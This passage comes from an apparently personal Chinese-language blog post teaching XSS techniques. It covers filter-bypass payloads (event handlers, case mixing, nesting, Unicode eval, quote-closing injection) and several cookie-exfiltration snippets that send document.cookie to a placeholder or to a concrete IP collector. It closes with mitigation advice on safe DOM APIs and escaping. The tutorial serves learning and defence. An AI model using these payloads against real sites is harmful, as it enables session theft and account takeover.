</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>{{</span><span class=s1>&#39;a&#39;</span><span class=o>.</span><span class=n>constructor</span><span class=o>.</span><span class=n>prototype</span><span class=o>.</span><span class=n>charAt</span><span class=o>=</span><span class=p>[]</span><span class=o>.</span><span class=n>join</span><span class=p>;</span><span class=o>$</span><span class=n>eval</span><span class=p>(</span><span class=s1>&#39;x=1} } };alert(1)//&#39;</span><span class=p>);}}</span>
</span></span></code></pre></td></tr></table></div></div><h3></h3><h2 id=bypass>bypass</h2><h3 id=html标签>HTML标签</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>alert</span><span class=p>(</span><span class=mi>1</span><span class=p>)&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=html属性>HTML属性</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;javascript:alert(&#39;XSS&#39;)&#34;</span><span class=p>&gt;</span>http://baidu,com<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>SCRIPT</span> <span class=na>SRC</span><span class=o>=</span><span class=s>&#34;http://27.25.151.48:12138/xss.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>SCRIPT</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p><code>xss.js</code>写这个</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>alert</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>IMG</span> <span class=na>SRC</span><span class=o>=</span><span class=s>javascript:alert(‘XSS’)</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>还可以利用属性的报错</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;x&#34;</span> <span class=na>onerror</span><span class=o>=</span><span class=s>&#34;alert(1)&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=利用unicode>利用Unicode</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nb>eval</span><span class=p>(</span><span class=s2>&#34;\u0061\u006c\u0065\u0072\u0074(&#39;XSS&#39;)&#34;</span><span class=p>)&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=闭合>闭合</h3><p>闭合插入恶意代码大家也是耳熟能详了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl>      <span class=nx>echo</span> <span class=s2>&#34;var a=&#39;&#34;</span><span class=p>.</span><span class=nx>$keyword</span><span class=p>.</span><span class=s2>&#34;&#39;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>?&gt;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?keyword=&#39;;alert(1);&#39;
</span></span></code></pre></td></tr></table></div></div><p>就变成了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=n>body</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=o>&lt;</span><span class=n>script</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=err>?</span><span class=n>php</span> 
</span></span><span class=line><span class=cl>      <span class=n>echo</span> <span class=s2>&#34;var a=&#39;&#39;;alert(1);&#39;&#39;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=err>?</span><span class=o>&gt;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>&lt;/</span><span class=n>script</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=n>body</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>成功插入</p><h3 id=payload解释>payload解释</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>img</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;img&#34;</span><span class=p>);</span> <span class=c1>//创建img变量
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>img</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=s1>&#39;http://ceye地址/&#39;</span> <span class=o>+</span> <span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>    .src是img属性通常指向地址，document.cookie是当前页面的所有cookie，猜测flag在其中
</span></span></span><span class=line><span class=cl><span class=cm>    &lt;script&gt;html标签
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nb>window</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>herf</span><span class=o>=</span><span class=s1>&#39;http://ceye地址/&#39;</span><span class=o>+</span><span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s1>&#39;http://ceye地址/&#39;</span><span class=o>+</span><span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>)</span>    
</span></span><span class=line><span class=cl>    <span class=c1>//window.open() 是 JavaScript 中用于打开新窗口或标签页的函数。
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>onload</span><span class=o>=</span><span class=s>&#34;window.open(&#39;http://ceye地址/&#39;+document.cookie)&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>iframe</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>onload是iframe的一个属性
</span></span><span class=line><span class=cl>而iframe 用于在当前html文档中嵌入html文档
</span></span><span class=line><span class=cl>其他的和上面一样
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>svg</span> <span class=na>onload</span><span class=o>=</span><span class=s>&#34;window.open(&#39;http://ceye地址/&#39;+document.cookie)&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span> <span class=na>onload</span><span class=o>=</span><span class=s>&#34;window.open(&#39;http://ceye地址/&#39;+document.cookie)&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>这种绕过就有点类似于命令执行中你禁用什么我就不用什么</p><h3 id=大小写>大小写</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=n>SCript</span><span class=o>&gt;</span><span class=n>window</span><span class=o>.</span><span class=n>location</span><span class=o>.</span><span class=n>herf</span><span class=o>=</span><span class=s1>&#39;http://27.25.151.48:12138/xss.php?a=&#39;</span><span class=o>+</span><span class=n>document</span><span class=o>.</span><span class=n>cookie</span><span class=o>&lt;/</span><span class=n>scRipt</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>body</span> <span class=n>onload</span><span class=o>=</span><span class=s2>&#34;window.open(&#39;http://27.25.151.48:12138/xss.php?a=&#39;+document.cookie)&#34;</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=绕过空格>绕过空格</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>/**/</span>
</span></span><span class=line><span class=cl><span class=o>/</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>svg</span><span class=o>/</span><span class=n>onload</span><span class=o>=</span><span class=s2>&#34;window.open(&#39;http://ceye地址/&#39;+document.cookie)&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>svg</span><span class=o>/**/</span><span class=n>onload</span><span class=o>=</span><span class=s2>&#34;window.open(&#39;http://ceye地址/&#39;+document.cookie)&#34;</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=嵌套>嵌套</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
</span></span></code></pre></td></tr></table></div></div><h2 id=fix>fix</h2><ul><li><p>在使用 <code>.innerHTML、.outerHTML、document.write() </code>时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用<code> .textContent、.setAttribute()</code> 等。</p></li><li><p>DOM 中的内联事件监听器，如 <code>location、onclick、onerror、onload、onmouseover </code>等， 标签的<code>href</code>属性，JavaScript 的<code>eval()、setTimeout()、setInterval()</code>等，都能把字符串作为代码运行。</p></li><li><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p><p>如果用 Vue / React 技术栈，并且不使用 <code>v-html</code> / <code>dangerouslySetInnerHTML</code> 功能，就在前端 <code>render</code> 渲染阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 XSS 隐患。</p><p>以下方式都能把字符串作为代码运行：</p><ul><li>DOM 中的内联事件监听器：如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等</li><li>HTML DOM 标签属性：<code>&lt;a></code> 标签的 <code>href</code> 属性</li><li>JavaScript 的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code> 等</li></ul></li><li><p>过滤老套路了</p></li><li><p>前端渲染的时候将代码和数据分开，不要执行恶意代码</p></li><li><p>拼接HTML时进行转义</p></li></ul><h1 id=0x03-小结>0x03 小结</h1><p>学习<code>xss</code>还是要知道一些<code>JavaScript</code>和<code>jquary</code>什么的函数不然还是很难，没想到一个个都是这样子的，不过现在也是会打一点点漏洞了，知道部分原理了</p><p><strong>bypass</strong>部分我知道还有很多要学的，但是我遭不住了，后面会更新的，还有这些常用函数什么的关于<code>js</code> <code>jquary</code>的会单独写写</p></section><footer class=article-footer><section class=article-tags><a href=/tags/xss/>Xss</a>
<a href=/tags/%E5%A7%BF%E5%8A%BF/>姿势</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.7k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>